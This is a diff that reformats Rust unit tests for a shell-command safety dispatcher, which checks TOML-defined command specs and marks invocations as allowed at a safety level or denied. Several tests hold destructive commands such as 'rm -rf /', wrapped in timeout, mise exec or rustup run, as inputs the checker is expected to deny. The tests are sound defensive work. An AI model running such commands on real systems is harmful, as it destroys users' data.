             require_any = ["--show"]
             standalone = ["--help", "--show", "-h"]
-        "#);
-        assert_eq!(
-            dispatch_spec(&toks(&["conda", "config", "--help"]), &spec),
-            Verdict::Allowed(SafetyLevel::Inert),
-        );
-        assert_eq!(
-            dispatch_spec(&toks(&["conda", "config", "-h"]), &spec),
-            Verdict::Allowed(SafetyLevel::Inert),
-        );
-    }
+        "#,
+    );
+    assert_eq!(dispatch_spec(&toks(&["conda", "config", "--help"]), &spec), Verdict::Allowed(SafetyLevel::Inert),);
+    assert_eq!(dispatch_spec(&toks(&["conda", "config", "-h"]), &spec), Verdict::Allowed(SafetyLevel::Inert),);
+}
 
-    #[test]
-    fn require_any_rejects_unknown_flags() {
-        let spec = load_one(r#"
+#[test]
+fn require_any_rejects_unknown_flags() {
+    let spec = load_one(
+        r#"
             [[command]]
             name = "conda"
 
@@ -1281,16 +1165,15 @@ use super::*;
             bare = false
             require_any = ["--show"]
             standalone = ["--help", "--show", "-h"]
-        "#);
-        assert_eq!(
-            dispatch_spec(&toks(&["conda", "config", "--show", "--evil"]), &spec),
-            Verdict::Denied,
-        );
-    }
+        "#,
+    );
+    assert_eq!(dispatch_spec(&toks(&["conda", "config", "--show", "--evil"]), &spec), Verdict::Denied,);
+}
 
-    #[test]
-    fn require_any_with_eq_syntax() {
-        let spec = load_one(r#"
+#[test]
+fn require_any_with_eq_syntax() {
+    let spec = load_one(
+        r#"
             [[command]]
             name = "tool"
 
@@ -1300,16 +1183,15 @@ use super::*;
             require_any = ["--mode"]
             standalone = ["--help"]
             valued = ["--mode"]
-        "#);
-        assert_eq!(
-            dispatch_spec(&toks(&["tool", "sub", "--mode=check"]), &spec),
-            Verdict::Allowed(SafetyLevel::Inert),
-        );
-    }
+        "#,
+    );
+    assert_eq!(dispatch_spec(&toks(&["tool", "sub", "--mode=check"]), &spec), Verdict::Allowed(SafetyLevel::Inert),);
+}
 
-    #[test]
-    fn require_any_rejects_unlisted_extra_flags() {
-        let spec = load_one(r#"
+#[test]
+fn require_any_rejects_unlisted_extra_flags() {
+    let spec = load_one(
+        r#"
             [[command]]
             name = "conda"
 
@@ -1318,16 +1200,15 @@ use super::*;
             bare = false
             require_any = ["--show", "--show-sources"]
             standalone = ["--help", "--show", "--show-sources", "-h"]
-        "#);
-        assert_eq!(
-            dispatch_spec(&toks(&["conda", "config", "--show", "--set"]), &spec),
-            Verdict::Denied,
-        );
-    }
+        "#,
+    );
+    assert_eq!(dispatch_spec(&toks(&["conda", "config", "--show", "--set"]), &spec), Verdict::Denied,);
+}
 
-    #[test]
-    fn require_any_short_eq_does_not_satisfy() {
-        let spec = load_one(r#"
+#[test]
+fn require_any_short_eq_does_not_satisfy() {
+    let spec = load_one(
+        r#"
             [[command]]
             name = "tool"
 
@@ -1336,39 +1217,31 @@ use super::*;
             bare = false
             require_any = ["--show", "-s"]
             standalone = ["--help", "--show", "-h", "-s"]
-        "#);
-        assert_eq!(
-            dispatch_spec(&toks(&["tool", "sub", "-s=foo"]), &spec),
-            Verdict::Denied,
-        );
-    }
+        "#,
+    );
+    assert_eq!(dispatch_spec(&toks(&["tool", "sub", "-s=foo"]), &spec), Verdict::Denied,);
+}
 
-    #[test]
-    fn require_any_short_in_combined_satisfies() {
-        let spec = load_one(r#"
+#[test]
+fn require_any_short_in_combined_satisfies() {
+    let spec = load_one(
+        r#"
             [[command]]
             name = "tool"
             bare = false
             require_any = ["-z"]
             standalone = ["-z", "-v", "-n", "-h", "--help"]
-        "#);
-        assert_eq!(
-            dispatch_spec(&toks(&["tool", "-zv", "host", "80"]), &spec),
-            Verdict::Allowed(SafetyLevel::Inert),
-        );
-        assert_eq!(
-            dispatch_spec(&toks(&["tool", "-nvz", "host", "80"]), &spec),
-            Verdict::Allowed(SafetyLevel::Inert),
-        );
-        assert_eq!(
-            dispatch_spec(&toks(&["tool", "-nv", "host", "80"]), &spec),
-            Verdict::Denied,
-        );
-    }
+        "#,
+    );
+    assert_eq!(dispatch_spec(&toks(&["tool", "-zv", "host", "80"]), &spec), Verdict::Allowed(SafetyLevel::Inert),);
+    assert_eq!(dispatch_spec(&toks(&["tool", "-nvz", "host", "80"]), &spec), Verdict::Allowed(SafetyLevel::Inert),);
+    assert_eq!(dispatch_spec(&toks(&["tool", "-nv", "host", "80"]), &spec), Verdict::Denied,);
+}
 
-    #[test]
-    fn require_any_long_eq_satisfies() {
-        let spec = load_one(r#"
+#[test]
+fn require_any_long_eq_satisfies() {
+    let spec = load_one(
+        r#"
             [[command]]
             name = "tool"
 
@@ -1377,16 +1250,15 @@ use super::*;
             bare = false
             require_any = ["--show", "-s"]
             valued = ["--show"]
-        "#);
-        assert_eq!(
-            dispatch_spec(&toks(&["tool", "sub", "--show=all"]), &spec),
-            Verdict::Allowed(SafetyLevel::Inert),
-        );
-    }
+        "#,
+    );
+    assert_eq!(dispatch_spec(&toks(&["tool", "sub", "--show=all"]), &spec), Verdict::Allowed(SafetyLevel::Inert),);
+}
 
-    #[test]
-    fn require_any_does_not_accept_bare_help() {
-        let spec = load_one(r#"
+#[test]
+fn require_any_does_not_accept_bare_help() {
+    let spec = load_one(
+        r#"
             [[command]]
             name = "tool"
 
@@ -1395,26 +1267,19 @@ use super::*;
             bare = false
             require_any = ["--show"]
             standalone = ["--help", "--show", "-h"]
-        "#);
-        assert_eq!(
-            dispatch_spec(&toks(&["tool", "sub", "--help"]), &spec),
-            Verdict::Allowed(SafetyLevel::Inert),
-        );
-        assert_eq!(
-            dispatch_spec(&toks(&["tool", "sub", "-h"]), &spec),
-            Verdict::Allowed(SafetyLevel::Inert),
-        );
-        assert_eq!(
-            dispatch_spec(&toks(&["tool", "sub", "help"]), &spec),
-            Verdict::Denied,
-        );
-    }
+        "#,
+    );
+    assert_eq!(dispatch_spec(&toks(&["tool", "sub", "--help"]), &spec), Verdict::Allowed(SafetyLevel::Inert),);
+    assert_eq!(dispatch_spec(&toks(&["tool", "sub", "-h"]), &spec), Verdict::Allowed(SafetyLevel::Inert),);
+    assert_eq!(dispatch_spec(&toks(&["tool", "sub", "help"]), &spec), Verdict::Denied,);
+}
 
-    // WriteFlagged
+// WriteFlagged
 
-    #[test]
-    fn write_flagged_base_level() {
-        let spec = load_one(r#"
+#[test]
+fn write_flagged_base_level() {
+    let spec = load_one(
+        r#"
             [[command]]
             name = "sk"
 
@@ -1423,16 +1288,15 @@ use super::*;
             write_flags = ["--history"]
             standalone = ["--help", "-h"]
             valued = ["--history", "--query", "-q"]
-        "#);
-        assert_eq!(
-            dispatch_spec(&toks(&["sk", "run", "-q", "test"]), &spec),
-            Verdict::Allowed(SafetyLevel::Inert),
-        );
-    }
+        "#,
+    );
+    assert_eq!(dispatch_spec(&toks(&["sk", "run", "-q", "test"]), &spec), Verdict::Allowed(SafetyLevel::Inert),);
+}
 
-    #[test]
-    fn write_flagged_with_write_flag() {
-        let spec = load_one(r#"
+#[test]
+fn write_flagged_with_write_flag() {
+    let spec = load_one(
+        r#"
             [[command]]
             name = "sk"
 
@@ -1441,16 +1305,15 @@ use super::*;
             write_flags = ["--history"]
             standalone = ["--help"]
             valued = ["--history", "--query"]
-        "#);
-        assert_eq!(
-            dispatch_spec(&toks(&["sk", "run", "--history", "/tmp/h"]), &spec),
-            Verdict::Allowed(SafetyLevel::SafeWrite),
-        );
-    }
+        "#,
+    );
+    assert_eq!(dispatch_spec(&toks(&["sk", "run", "--history", "/tmp/h"]), &spec), Verdict::Allowed(SafetyLevel::SafeWrite),);
+}
 
-    #[test]
-    fn write_flagged_with_eq_syntax() {
-        let spec = load_one(r#"
+#[test]
+fn write_flagged_with_eq_syntax() {
+    let spec = load_one(
+        r#"
             [[command]]
             name = "sk"
 
@@ -1458,152 +1321,145 @@ use super::*;
             name = "run"
             write_flags = ["--history"]
             valued = ["--history"]
-        "#);
-        assert_eq!(
-            dispatch_spec(&toks(&["sk", "run", "--history=/tmp/h"]), &spec),
-            Verdict::Allowed(SafetyLevel::SafeWrite),
-        );
-    }
+        "#,
+    );
+    assert_eq!(dispatch_spec(&toks(&["sk", "run", "--history=/tmp/h"]), &spec), Verdict::Allowed(SafetyLevel::SafeWrite),);
+}
 
-    // DelegateAfterSeparator
+// DelegateAfterSeparator
 
-    #[test]
-    fn delegate_after_separator_safe() {
-        let spec = load_one(r#"
+#[test]
+fn delegate_after_separator_safe() {
+    let spec = load_one(
+        r#"
             [[command]]
             name = "mise"
 
             [[command.sub]]
             name = "exec"
             delegate_after = "--"
-        "#);
-        assert_eq!(
-            dispatch_spec(&toks(&["mise", "exec", "--", "echo", "hello"]), &spec),
-            Verdict::Allowed(SafetyLevel::Inert),
-        );
-    }
+        "#,
+    );
+    assert_eq!(dispatch_spec(&toks(&["mise", "exec", "--", "echo", "hello"]), &spec), Verdict::Allowed(SafetyLevel::Inert),);
+}
 
-    #[test]
-    fn delegate_after_separator_unsafe() {
-        let spec = load_one(r#"
+#[test]
+fn delegate_after_separator_unsafe() {
+    let spec = load_one(
+        r#"
             [[command]]
             name = "mise"
 
             [[command.sub]]
             name = "exec"
             delegate_after = "--"
-        "#);
-        assert_eq!(
-            dispatch_spec(&toks(&["mise", "exec", "--", "rm", "-rf", "/"]), &spec),
-            Verdict::Denied,
-        );
-    }
+        "#,
+    );
+    assert_eq!(dispatch_spec(&toks(&["mise", "exec", "--", "rm", "-rf", "/"]), &spec), Verdict::Denied,);
+}
 
-    #[test]
-    fn delegate_after_separator_no_separator() {
-        let spec = load_one(r#"
+#[test]
+fn delegate_after_separator_no_separator() {
+    let spec = load_one(
+        r#"
             [[command]]
             name = "mise"
 
             [[command.sub]]
             name = "exec"
             delegate_after = "--"
-        "#);
-        assert_eq!(
-            dispatch_spec(&toks(&["mise", "exec", "echo"]), &spec),
-            Verdict::Denied,
-        );
-    }
+        "#,
+    );
+    assert_eq!(dispatch_spec(&toks(&["mise", "exec", "echo"]), &spec), Verdict::Denied,);
+}
 
-    // DelegateSkip
+// DelegateSkip
 
-    #[test]
-    fn delegate_skip_safe() {
-        let spec = load_one(r#"
+#[test]
+fn delegate_skip_safe() {
+    let spec = load_one(
+        r#"
             [[command]]
             name = "rustup"
 
             [[command.sub]]
             name = "run"
             delegate_skip = 2
-        "#);
-        assert_eq!(
-            dispatch_spec(&toks(&["rustup", "run", "stable", "echo", "hello"]), &spec),
-            Verdict::Allowed(SafetyLevel::Inert),
-        );
-    }
+        "#,
+    );
+    assert_eq!(dispatch_spec(&toks(&["rustup", "run", "stable", "echo", "hello"]), &spec), Verdict::Allowed(SafetyLevel::Inert),);
+}
 
-    #[test]
-    fn delegate_skip_unsafe() {
-        let spec = load_one(r#"
+#[test]
+fn delegate_skip_unsafe() {
+    let spec = load_one(
+        r#"
             [[command]]
             name = "rustup"
 
             [[command.sub]]
             name = "run"
             delegate_skip = 2
-        "#);
-        assert_eq!(
-            dispatch_spec(&toks(&["rustup", "run", "stable", "rm", "-rf"]), &spec),
-            Verdict::Denied,
-        );
-    }
+        "#,
+    );
+    assert_eq!(dispatch_spec(&toks(&["rustup", "run", "stable", "rm", "-rf"]), &spec), Verdict::Denied,);
+}
 
-    #[test]
-    fn delegate_skip_no_inner() {
-        let spec = load_one(r#"
+#[test]
+fn delegate_skip_no_inner() {
+    let spec = load_one(
+        r#"
             [[command]]
             name = "rustup"
 
             [[command.sub]]
             name = "run"
             delegate_skip = 2
-        "#);
-        assert_eq!(
-            dispatch_spec(&toks(&["rustup", "run", "stable"]), &spec),
-            Verdict::Denied,
-        );
-    }
+        "#,
+    );
+    assert_eq!(dispatch_spec(&toks(&["rustup", "run", "stable"]), &spec), Verdict::Denied,);
+}
 
-    // Aliases
+// Aliases
 
-    #[test]
-    fn alias_dispatch() {
-        let specs = load_toml(r#"
+#[test]
+fn alias_dispatch() {
+    let specs = load_toml(
+        r#"
             [[command]]
             name = "grep"
             aliases = ["egrep"]
             bare = false
             standalone = ["-r"]
-        "#, "test").expect("valid test definition");
-        let registry = build_registry(specs);
-        let spec = registry.get("egrep").expect("alias registered");
-        assert_eq!(
-            dispatch_spec(&toks(&["egrep", "-r", "pattern"]), spec),
-            Verdict::Allowed(SafetyLevel::Inert),
-        );
-    }
+        "#,
+        "test",
+    )
+    .expect("valid test definition");
+    let registry = build_registry(specs);
+    let spec = registry.get("egrep").expect("alias registered");
+    assert_eq!(dispatch_spec(&toks(&["egrep", "-r", "pattern"]), spec), Verdict::Allowed(SafetyLevel::Inert),);
+}
 
-    // Custom handler reference
+// Custom handler reference
 
-    #[test]
-    fn custom_handler_returns_denied_by_default() {
-        let spec = load_one(r#"
+#[test]
+fn custom_handler_returns_denied_by_default() {
+    let spec = load_one(
+        r#"
             [[command]]
             name = "curl"
             handler = "curl"
-        "#);
-        assert_eq!(
-            dispatch_spec(&toks(&["curl", "http://example.com"]), &spec),
-            Verdict::Denied,
-        );
-    }
+        "#,
+    );
+    assert_eq!(dispatch_spec(&toks(&["curl", "http://example.com"]), &spec), Verdict::Denied,);
+}
 
-    // Structured with wrapper (global flag stripping)
+// Structured with wrapper (global flag stripping)
 
-    #[test]
-    fn structured_wrapper_strips_flags() {
-        let spec = load_one(r#"
+#[test]
+fn structured_wrapper_strips_flags() {
+    let spec = load_one(
+        r#"
             [[command]]
             name = "jj"
             bare_flags = ["--help", "--version", "-h"]
@@ -1614,24 +1470,17 @@ use super::*;
             [[command.sub]]
             name = "log"
             standalone = ["--help", "-h"]
-        "#);
-        assert_eq!(
-            dispatch_spec(&toks(&["jj", "--no-pager", "log"]), &spec),
-            Verdict::Allowed(SafetyLevel::Inert),
-        );
-        assert_eq!(
-            dispatch_spec(&toks(&["jj", "--color", "auto", "log"]), &spec),
-            Verdict::Allowed(SafetyLevel::Inert),
-        );
-        assert_eq!(
-            dispatch_spec(&toks(&["jj", "-R", "/repo", "--quiet", "log"]), &spec),
-            Verdict::Allowed(SafetyLevel::Inert),
-        );
-    }
+        "#,
+    );
+    assert_eq!(dispatch_spec(&toks(&["jj", "--no-pager", "log"]), &spec), Verdict::Allowed(SafetyLevel::Inert),);
+    assert_eq!(dispatch_spec(&toks(&["jj", "--color", "auto", "log"]), &spec), Verdict::Allowed(SafetyLevel::Inert),);
+    assert_eq!(dispatch_spec(&toks(&["jj", "-R", "/repo", "--quiet", "log"]), &spec), Verdict::Allowed(SafetyLevel::Inert),);
+}
 
-    #[test]
-    fn structured_wrapper_still_dispatches_subs() {
-        let spec = load_one(r#"
+#[test]
+fn structured_wrapper_still_dispatches_subs() {
+    let spec = load_one(
+        r#"
             [[command]]
             name = "jj"
             bare_flags = ["--help", "-h"]
@@ -1643,24 +1492,17 @@ use super::*;
 
             [[command.sub]]
             name = "diff"
-        "#);
-        assert_eq!(
-            dispatch_spec(&toks(&["jj", "log"]), &spec),
-            Verdict::Allowed(SafetyLevel::Inert),
-        );
-        assert_eq!(
-            dispatch_spec(&toks(&["jj", "diff"]), &spec),
-            Verdict::Allowed(SafetyLevel::Inert),
-        );
-        assert_eq!(
-            dispatch_spec(&toks(&["jj", "push"]), &spec),
-            Verdict::Denied,
-        );
-    }
+        "#,
+    );
+    assert_eq!(dispatch_spec(&toks(&["jj", "log"]), &spec), Verdict::Allowed(SafetyLevel::Inert),);
+    assert_eq!(dispatch_spec(&toks(&["jj", "diff"]), &spec), Verdict::Allowed(SafetyLevel::Inert),);
+    assert_eq!(dispatch_spec(&toks(&["jj", "push"]), &spec), Verdict::Denied,);
+}
 
-    #[test]
-    fn structured_wrapper_bare_flags_still_work() {
-        let spec = load_one(r#"
+#[test]
+fn structured_wrapper_bare_flags_still_work() {
+    let spec = load_one(
+        r#"
             [[command]]
             name = "jj"
             bare_flags = ["--help", "--version", "-h"]
@@ -1669,20 +1511,16 @@ use super::*;
 
             [[command.sub]]
             name = "log"
-        "#);
-        assert_eq!(
-            dispatch_spec(&toks(&["jj", "--help"]), &spec),
-            Verdict::Allowed(SafetyLevel::Inert),
-        );
-        assert_eq!(
-            dispatch_spec(&toks(&["jj", "--version"]), &spec),
-            Verdict::Allowed(SafetyLevel::Inert),
-        );
-    }
+        "#,
+    );
+    assert_eq!(dispatch_spec(&toks(&["jj", "--help"]), &spec), Verdict::Allowed(SafetyLevel::Inert),);
+    assert_eq!(dispatch_spec(&toks(&["jj", "--version"]), &spec), Verdict::Allowed(SafetyLevel::Inert),);
+}
 
-    #[test]
-    fn structured_wrapper_combined_short_cluster() {
-        let spec = load_one(r#"
+#[test]
+fn structured_wrapper_combined_short_cluster() {
+    let spec = load_one(
+        r#"
             [[command]]
             name = "toolbox"
             bare_flags = ["--help", "-h"]
@@ -1691,24 +1529,17 @@ use super::*;
 
             [[command.sub]]
             name = "list"
-        "#);
-        assert_eq!(
-            dispatch_spec(&toks(&["toolbox", "-vv", "list"]), &spec),
-            Verdict::Allowed(SafetyLevel::Inert),
-        );
-        assert_eq!(
-            dispatch_spec(&toks(&["toolbox", "-vvv", "list"]), &spec),
-            Verdict::Allowed(SafetyLevel::Inert),
-        );
-        assert_eq!(
-            dispatch_spec(&toks(&["toolbox", "-vx", "list"]), &spec),
-            Verdict::Denied,
-        );
-    }
+        "#,
+    );
+    assert_eq!(dispatch_spec(&toks(&["toolbox", "-vv", "list"]), &spec), Verdict::Allowed(SafetyLevel::Inert),);
+    assert_eq!(dispatch_spec(&toks(&["toolbox", "-vvv", "list"]), &spec), Verdict::Allowed(SafetyLevel::Inert),);
+    assert_eq!(dispatch_spec(&toks(&["toolbox", "-vx", "list"]), &spec), Verdict::Denied,);
+}
 
-    #[test]
-    fn structured_wrapper_bare_flag_after_wrapper() {
-        let spec = load_one(r#"
+#[test]
+fn structured_wrapper_bare_flag_after_wrapper() {
+    let spec = load_one(
+        r#"
             [[command]]
             name = "toolbox"
             bare_flags = ["--help", "-h"]
@@ -1718,28 +1549,18 @@ use super::*;
 
             [[command.sub]]
             name = "list"
-        "#);
-        assert_eq!(
-            dispatch_spec(&toks(&["toolbox", "--verbose", "--help"]), &spec),
-            Verdict::Allowed(SafetyLevel::Inert),
-        );
-        assert_eq!(
-            dispatch_spec(&toks(&["toolbox", "--help", "--verbose"]), &spec),
-            Verdict::Allowed(SafetyLevel::Inert),
-        );
-        assert_eq!(
-            dispatch_spec(&toks(&["toolbox", "--log-level", "info", "--help", "-v"]), &spec),
-            Verdict::Allowed(SafetyLevel::Inert),
-        );
-        assert_eq!(
-            dispatch_spec(&toks(&["toolbox", "--help", "stray"]), &spec),
-            Verdict::Denied,
-        );
-    }
+        "#,
+    );
+    assert_eq!(dispatch_spec(&toks(&["toolbox", "--verbose", "--help"]), &spec), Verdict::Allowed(SafetyLevel::Inert),);
+    assert_eq!(dispatch_spec(&toks(&["toolbox", "--help", "--verbose"]), &spec), Verdict::Allowed(SafetyLevel::Inert),);
+    assert_eq!(dispatch_spec(&toks(&["toolbox", "--log-level", "info", "--help", "-v"]), &spec), Verdict::Allowed(SafetyLevel::Inert),);
+    assert_eq!(dispatch_spec(&toks(&["toolbox", "--help", "stray"]), &spec), Verdict::Denied,);
+}
 
-    #[test]
-    fn structured_wrapper_rejects_unknown_sub() {
-        let spec = load_one(r#"
+#[test]
+fn structured_wrapper_rejects_unknown_sub() {
+    let spec = load_one(
+        r#"
             [[command]]
             name = "jj"
             [command.wrapper]
@@ -1747,16 +1568,15 @@ use super::*;
 
             [[command.sub]]
             name = "log"
-        "#);
-        assert_eq!(
-            dispatch_spec(&toks(&["jj", "--no-pager", "push"]), &spec),
-            Verdict::Denied,
-        );
-    }
+        "#,
+    );
+    assert_eq!(dispatch_spec(&toks(&["jj", "--no-pager", "push"]), &spec), Verdict::Denied,);
+}
 
-    #[test]
-    fn structured_wrapper_eq_syntax() {
-        let spec = load_one(r#"
+#[test]
+fn structured_wrapper_eq_syntax() {
+    let spec = load_one(
+        r#"
             [[command]]
             name = "jj"
             [command.wrapper]
@@ -1764,181 +1584,164 @@ use super::*;
 
             [[command.sub]]
             name = "log"
-        "#);
-        assert_eq!(
-            dispatch_spec(&toks(&["jj", "--color=auto", "log"]), &spec),
-            Verdict::Allowed(SafetyLevel::Inert),
-        );
-    }
+        "#,
+    );
+    assert_eq!(dispatch_spec(&toks(&["jj", "--color=auto", "log"]), &spec), Verdict::Allowed(SafetyLevel::Inert),);
+}
 
-    #[test]
-    fn structured_no_wrapper_unchanged() {
-        let spec = load_one(r#"
+#[test]
+fn structured_no_wrapper_unchanged() {
+    let spec = load_one(
+        r#"
             [[command]]
             name = "cargo"
             bare_flags = ["--help"]
 
             [[command.sub]]
             name = "test"
-        "#);
-        assert_eq!(
-            dispatch_spec(&toks(&["cargo", "test"]), &spec),
-            Verdict::Allowed(SafetyLevel::Inert),
-        );
-        assert_eq!(
-            dispatch_spec(&toks(&["cargo", "--help"]), &spec),
-            Verdict::Allowed(SafetyLevel::Inert),
-        );
-    }
+        "#,
+    );
+    assert_eq!(dispatch_spec(&toks(&["cargo", "test"]), &spec), Verdict::Allowed(SafetyLevel::Inert),);
+    assert_eq!(dispatch_spec(&toks(&["cargo", "--help"]), &spec), Verdict::Allowed(SafetyLevel::Inert),);
+}
 
-    // Wrapper (delegate inner command)
+// Wrapper (delegate inner command)
 
-    #[test]
-    fn wrapper_delegates_safe_inner() {
-        let spec = load_one(r#"
+#[test]
+fn wrapper_delegates_safe_inner() {
+    let spec = load_one(
+        r#"
             [[command]]
             name = "timeout"
             [command.wrapper]
             valued = ["--signal", "--kill-after", "-s", "-k"]
             standalone = ["--preserve-status"]
             positional_skip = 1
-        "#);
-        assert_eq!(
-            dispatch_spec(&toks(&["timeout", "30", "echo", "hello"]), &spec),
-            Verdict::Allowed(SafetyLevel::Inert),
-        );
-    }
+        "#,
+    );
+    assert_eq!(dispatch_spec(&toks(&["timeout", "30", "echo", "hello"]), &spec), Verdict::Allowed(SafetyLevel::Inert),);
+}
 
-    #[test]
-    fn wrapper_rejects_unsafe_inner() {
-        let spec = load_one(r#"
+#[test]
+fn wrapper_rejects_unsafe_inner() {
+    let spec = load_one(
+        r#"
             [[command]]
             name = "timeout"
             [command.wrapper]
             positional_skip = 1
-        "#);
-        assert_eq!(
-            dispatch_spec(&toks(&["timeout", "30", "rm", "-rf", "/"]), &spec),
-            Verdict::Denied,
-        );
-    }
+        "#,
+    );
+    assert_eq!(dispatch_spec(&toks(&["timeout", "30", "rm", "-rf", "/"]), &spec), Verdict::Denied,);
+}
 
-    #[test]
-    fn wrapper_skips_flags_then_delegates() {
-        let spec = load_one(r#"
+#[test]
+fn wrapper_skips_flags_then_delegates() {
+    let spec = load_one(
+        r#"
             [[command]]
             name = "timeout"
             [command.wrapper]
             valued = ["--signal", "-s", "--kill-after", "-k"]
             standalone = ["--preserve-status"]
             positional_skip = 1
-        "#);
-        assert_eq!(
-            dispatch_spec(&toks(&["timeout", "-s", "KILL", "60", "echo", "hello"]), &spec),
-            Verdict::Allowed(SafetyLevel::Inert),
-        );
-        assert_eq!(
-            dispatch_spec(&toks(&["timeout", "--preserve-status", "120", "git", "status"]), &spec),
-            Verdict::Allowed(SafetyLevel::Inert),
-        );
-    }
+        "#,
+    );
+    assert_eq!(dispatch_spec(&toks(&["timeout", "-s", "KILL", "60", "echo", "hello"]), &spec), Verdict::Allowed(SafetyLevel::Inert),);
+    assert_eq!(
+        dispatch_spec(&toks(&["timeout", "--preserve-status", "120", "git", "status"]), &spec),
+        Verdict::Allowed(SafetyLevel::Inert),
+    );
+}
 
-    #[test]
-    fn wrapper_no_inner_denied() {
-        let spec = load_one(r#"
+#[test]
+fn wrapper_no_inner_denied() {
+    let spec = load_one(
+        r#"
             [[command]]
             name = "timeout"
             [command.wrapper]
             positional_skip = 1
-        "#);
-        assert_eq!(
-            dispatch_spec(&toks(&["timeout", "30"]), &spec),
-            Verdict::Denied,
-        );
-    }
+        "#,
+    );
+    assert_eq!(dispatch_spec(&toks(&["timeout", "30"]), &spec), Verdict::Denied,);
+}
 
-    #[test]
-    fn wrapper_bare_ok() {
-        let spec = load_one(r#"
+#[test]
+fn wrapper_bare_ok() {
+    let spec = load_one(
+        r#"
             [[command]]
             name = "env"
             [command.wrapper]
             valued = ["--unset", "-u"]
             standalone = ["--ignore-environment", "-i"]
             bare_ok = true
-        "#);
-        assert_eq!(
-            dispatch_spec(&toks(&["env"]), &spec),
-            Verdict::Allowed(SafetyLevel::Inert),
-        );
-    }
+        "#,
+    );
+    assert_eq!(dispatch_spec(&toks(&["env"]), &spec), Verdict::Allowed(SafetyLevel::Inert),);
+}
 
-    #[test]
-    fn wrapper_bare_not_ok() {
-        let spec = load_one(r#"
+#[test]
+fn wrapper_bare_not_ok() {
+    let spec = load_one(
+        r#"
             [[command]]
             name = "time"
             [command.wrapper]
             standalone = ["-p"]
-        "#);
-        assert_eq!(
-            dispatch_spec(&toks(&["time"]), &spec),
-            Verdict::Denied,
-        );
-    }
+        "#,
+    );
+    assert_eq!(dispatch_spec(&toks(&["time"]), &spec), Verdict::Denied,);
+}
 
-    #[test]
-    fn wrapper_with_separator() {
-        let spec = load_one(r#"
+#[test]
+fn wrapper_with_separator() {
+    let spec = load_one(
+        r#"
             [[command]]
             name = "dotenv"
             [command.wrapper]
             valued = ["-c", "-e", "-f", "-v"]
             separator = "--"
-        "#);
-        assert_eq!(
-            dispatch_spec(&toks(&["dotenv", "-f", ".env", "--", "git", "status"]), &spec),
-            Verdict::Allowed(SafetyLevel::Inert),
-        );
-    }
+        "#,
+    );
+    assert_eq!(dispatch_spec(&toks(&["dotenv", "-f", ".env", "--", "git", "status"]), &spec), Verdict::Allowed(SafetyLevel::Inert),);
+}
 
-    #[test]
-    fn wrapper_simple_no_flags() {
-        let spec = load_one(r#"
+#[test]
+fn wrapper_simple_no_flags() {
+    let spec = load_one(
+        r#"
             [[command]]
             name = "time"
             [command.wrapper]
             standalone = ["-p"]
-        "#);
-        assert_eq!(
-            dispatch_spec(&toks(&["time", "git", "log"]), &spec),
-            Verdict::Allowed(SafetyLevel::Inert),
-        );
-        assert_eq!(
-            dispatch_spec(&toks(&["time", "-p", "git", "log"]), &spec),
-            Verdict::Allowed(SafetyLevel::Inert),
-        );
-    }
+        "#,
+    );
+    assert_eq!(dispatch_spec(&toks(&["time", "git", "log"]), &spec), Verdict::Allowed(SafetyLevel::Inert),);
+    assert_eq!(dispatch_spec(&toks(&["time", "-p", "git", "log"]), &spec), Verdict::Allowed(SafetyLevel::Inert),);
+}
 
-    #[test]
-    fn wrapper_nested_delegation() {
-        let spec = load_one(r#"
+#[test]
+fn wrapper_nested_delegation() {
+    let spec = load_one(
+        r#"
             [[command]]
             name = "nice"
             [command.wrapper]
             valued = ["-n", "--adjustment"]
-        "#);
-        assert_eq!(
-            dispatch_spec(&toks(&["nice", "-n", "10", "cargo", "test"]), &spec),
-            Verdict::Allowed(SafetyLevel::SafeRead),
-        );
-    }
+        "#,
+    );
+    assert_eq!(dispatch_spec(&toks(&["nice", "-n", "10", "cargo", "test"]), &spec), Verdict::Allowed(SafetyLevel::SafeRead),);
+}
 
-    // Multiple commands in one file
+// Multiple commands in one file
 
-    #[test]
-    fn multiple_commands() {
-        let specs = load_toml(r#"
+#[test]
+fn multiple_commands() {
+    let specs = load_toml(
+        r#"
             [[command]]
             name = "cat"
             bare = true
@@ -1948,763 +1751,723 @@ use super::*;
             name = "head"
             bare = false
             valued = ["-n"]
-        "#, "test").expect("valid test definition");
-        assert_eq!(specs.len(), 2);
-        assert_eq!(specs[0].name, "cat");
-        assert_eq!(specs[1].name, "head");
-    }
+        "#,
+        "test",
+    )
+    .expect("valid test definition");
+    assert_eq!(specs.len(), 2);
+    assert_eq!(specs[0].name, "cat");
+    assert_eq!(specs[1].name, "head");
+}
 
-    // Edge cases
+// Edge cases
 
-    #[test]
-    fn valued_flag_at_end_without_value() {
-        let spec = load_one(r#"
+#[test]
+fn valued_flag_at_end_without_value() {
+    let spec = load_one(
+        r#"
             [[command]]
             name = "grep"
             bare = false
             valued = ["--max-count"]
-        "#);
-        assert_eq!(
-            dispatch_spec(&toks(&["grep", "--max-count"]), &spec),
-            Verdict::Allowed(SafetyLevel::Inert),
-        );
-    }
+        "#,
+    );
+    assert_eq!(dispatch_spec(&toks(&["grep", "--max-count"]), &spec), Verdict::Allowed(SafetyLevel::Inert),);
+}
 
-    #[test]
-    fn bare_dash_as_stdin() {
-        let spec = load_one(r#"
+#[test]
+fn bare_dash_as_stdin() {
+    let spec = load_one(
+        r#"
             [[command]]
             name = "grep"
             bare = false
             standalone = ["-r"]
-        "#);
-        assert_eq!(
-            dispatch_spec(&toks(&["grep", "pattern", "-"]), &spec),
-            Verdict::Allowed(SafetyLevel::Inert),
-        );
-    }
+        "#,
+    );
+    assert_eq!(dispatch_spec(&toks(&["grep", "pattern", "-"]), &spec), Verdict::Allowed(SafetyLevel::Inert),);
+}
 
-    #[test]
-    fn tolerate_unknown_long_eq_form() {
-        let spec = load_one(r#"
+#[test]
+fn tolerate_unknown_long_eq_form() {
+    let spec = load_one(
+        r#"
             [[command]]
             name = "echo"
             bare = true
             tolerate_unknown_long = true
-        "#);
-        assert_eq!(
-            dispatch_spec(&toks(&["echo", "--foo=bar"]), &spec),
-            Verdict::Allowed(SafetyLevel::Inert),
-        );
-    }
+        "#,
+    );
+    assert_eq!(dispatch_spec(&toks(&["echo", "--foo=bar"]), &spec), Verdict::Allowed(SafetyLevel::Inert),);
+}
 
-    #[test]
-    fn tolerate_unknown_long_with_max() {
-        let spec = load_one(r#"
+#[test]
+fn tolerate_unknown_long_with_max() {
+    let spec = load_one(
+        r#"
             [[command]]
             name = "echo"
             bare = true
             tolerate_unknown_long = true
             max_positional = 2
-        "#);
-        assert_eq!(
-            dispatch_spec(&toks(&["echo", "--a", "--b"]), &spec),
-            Verdict::Allowed(SafetyLevel::Inert),
-        );
